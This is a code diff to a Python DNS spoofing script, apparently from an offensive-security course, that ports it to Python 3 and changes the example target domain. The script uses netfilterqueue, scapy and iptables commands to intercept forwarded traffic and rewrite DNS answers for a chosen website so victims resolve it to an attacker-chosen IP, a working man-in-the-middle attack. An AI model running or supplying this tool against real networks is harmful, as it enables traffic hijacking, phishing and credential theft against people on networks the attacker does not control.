@@ -1,6 +1,6 @@
 # iptables -A INPUT -p udp  --sport 53 -j NFQUEUE --queue-num 1
 # iptables -I FORWARD -j NFQUEUE --queue-num 1
-# python 05-dns_spoof/dns_spoofer.py -w www.stealmylogin.com -i 192.168.0.35
+# python 05-dns_spoof/dns_spoofer.py -w www.marca.com -i 192.168.0.35
 
 import netfilterqueue
 import scapy.all as scapy
@@ -22,7 +22,7 @@ def spoof_packet(packet):
     dns_packet = scapy.IP(packet.get_payload())
     if dns_packet.haslayer(scapy.DNSRR):
         qname = dns_packet[scapy.DNSQR].qname
-        if options.website in qname:
+        if options.website in qname.decode("utf-8"):
             dns_responce = scapy.DNSRR(rrname=qname, rdata=options.ip)
             dns_packet[scapy.DNS].an = dns_responce
             dns_packet[scapy.DNS].ancount = 1
@@ -32,7 +32,8 @@ def spoof_packet(packet):
             del dns_packet[scapy.UDP].len
             del dns_packet[scapy.UDP].chksum
 
-            packet.set_payload(str(dns_packet))
+            # packet.set_payload(str(dns_packet))
+            packet.set_payload(bytes(dns_packet))
     packet.accept()
 
 
